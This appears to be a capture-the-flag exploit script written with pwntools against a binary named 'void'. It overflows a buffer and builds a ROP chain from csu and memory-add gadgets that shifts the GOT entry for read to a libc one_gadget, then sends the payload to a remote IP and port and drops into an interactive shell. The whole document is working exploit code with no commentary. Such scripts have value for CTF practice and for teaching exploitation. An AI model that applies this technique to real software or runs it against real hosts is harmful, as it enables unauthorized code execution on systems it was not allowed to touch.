from pwn import *
import sys

rem = True
elf = ELF('./void')
rop = ROP(elf)
libc = ELF('./glibc/libc.so.6')

vuln = elf.symbols['vuln']
g_rdi_ret = rop.find_gadget(['pop rdi', 'ret']).address
g_rsi_r15_ret = 0x00000000004011b9

got_read = elf.got['read']

p = None

if not rem:
    p = process('./void')
else:
    p = remote('139.59.176.230', 30001)

padding = b'A' * 64 + b'B' * 8
main_overwrite = 0x0040114b
csu = 0x004011b2
off_to_og = 0xc961a - libc.sym['read']
g_mem_add = 0x0000000000401108
g_vuln_call = 0x0040113b

input('> ')
chain1 = p64(csu) + p64(off_to_og, sign='signed') + p64(elf.got['read']+0x3d) + p64(0) * 4 + p64(g_mem_add) + p64(g_vuln_call)
p.sendline(padding + chain1)

p.interactive()
